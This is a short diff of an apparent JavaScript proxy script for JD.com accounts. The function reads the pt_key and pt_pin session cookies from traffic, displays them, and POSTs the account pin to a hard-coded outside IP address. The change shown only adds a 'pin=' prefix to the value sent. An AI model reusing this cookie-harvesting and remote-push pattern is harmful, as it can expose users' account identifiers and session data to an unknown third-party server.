@@ -50,7 +50,7 @@ function GetCookie() {
                 const CookieValue = CV.match(/pt_key=.+?;/) + CV.match(/pt_pin=.+?;/);
                 $.notify('临时Cookie','',CookieValue);
                 var pt_pin =CV.match(/pt_pin=.+?;/)
-                var pin =pt_pin.toString().split('=')[1]
+                var pin ="pin="+pt_pin.toString().split('=')[1]
                 let data={"key":pin}
                 const opt = {url: "http://120.46.171.189/push", body: JSON.stringify(data)};
                 $.http.post(opt).then((response) => JSON.parse(response.body));
